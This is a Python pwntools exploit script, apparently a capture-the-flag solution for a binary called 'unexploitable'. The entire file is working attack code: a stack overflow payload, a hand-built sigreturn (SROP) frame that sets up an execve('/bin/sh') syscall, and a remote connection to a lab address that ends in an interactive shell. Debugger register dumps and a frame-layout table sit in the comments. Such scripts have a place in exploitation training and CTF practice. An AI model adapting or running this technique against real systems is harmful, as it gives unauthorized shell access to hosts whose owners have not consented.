#!/usr/bin/env python
from pwn import * 
import time

# gdb-peda$ findsyscall
# Searching for '0x050f' in range: 0x400000 - 0x401000
# Found 1 results, display max 1 items:
# unexploitable : 0x40056f (<main+43>:	syscall)

# sig frame in x64
#                    eax=15
# 0x00 	rt_sigreturn 	  	uc_flags
# 0x10	&uc		  	uc_stack.ss_sp
# 0x20	uc_stack.ss_flags 	uc_stack.ss_size
# 0x30	r8		  	r9
# 0x40	r10			r11
# 0x50	r12			r13
# 0x60	r14			r15
# 0x70	rdi = &"bin/sh"		rsi
# 0x80	rbp != 0		rbx
# 0x90	rdx			rax = 59 (execv)
# 0xa0	rcx			rsp != 0
# 0xb0	rip = &syscall		eflags
# 0xc0	cs/gs/fs		err
# 0xd0	trapno			oldmask
# 0xe0	cr2(segfault addr)	&fpstate
# 0xf0	_reserved		sigmask

#r = process('./unexploitable')
r = remote('192.168.31.25',55001)

#a = raw_input()
unexp = ELF('./unexploitable')

lea_eax_ebp = 0x40056a
syscall = 0x40056f 

payload1 = ''
payload1 += 'AAAA'*4
payload1 += p64(unexp.bss()+0x10)  #ebp
payload1 += p64(lea_eax_ebp)

'''
gdb-peda$ info reg
rax            0x3	0x3
rbx            0x0	0x0
rcx            0x7f1cb606f810	0x7f1cb606f810
rdx            0x50f	0x50f
rsi            0x601048	0x601048
rdi            0x0	0x0
rbp            0x601028	0x601028 <completed.6531>
rsp            0x601060	0x601060
r8             0x6320756f79206562	0x6320756f79206562
r9             0x65766f7270206e61	0x65766f7270206e61
r10            0x7fffdcdb6fc0	0x7fffdcdb6fc0
r11            0x246	0x246
r12            0x400460	0x400460
r13            0x7fffdcdb72f0	0x7fffdcdb72f0
r14            0x0	0x0
r15            0x0	0x0
rip            0x400586	0x400586 <main+66>
eflags         0x203	[ CF IF ]
cs             0x33	0x33
ss             0x2b	0x2b
ds             0x0	0x0
es             0x0	0x0
fs             0x0	0x0
gs             0x0	0x0
'''

sig_frame=''
sig_frame += p64(syscall) 
sig_frame += p64(0)*13 
sig_frame += p64(unexp.bss()) 
sig_frame += p64(0)*1
sig_frame += p64(unexp.bss()) 
sig_frame += p64(0)*2
sig_frame += p64(59)
sig_frame += p64(0)*1
sig_frame += p64(unexp.bss()) 
sig_frame += p64(syscall)
sig_frame += p64(0x203)
sig_frame += p64(0x33)
sig_frame += p64(0)*7


#r.recvuntil(':)')
r.send(payload1)
time.sleep(1)
r.send('/bin/sh\x00' +'A'*8 + p64(unexp.bss()+0x30) + p64(lea_eax_ebp)  + p64(unexp.bss())*3+ sig_frame )
time.sleep(1)
r.send('A'*15)

r.interactive()








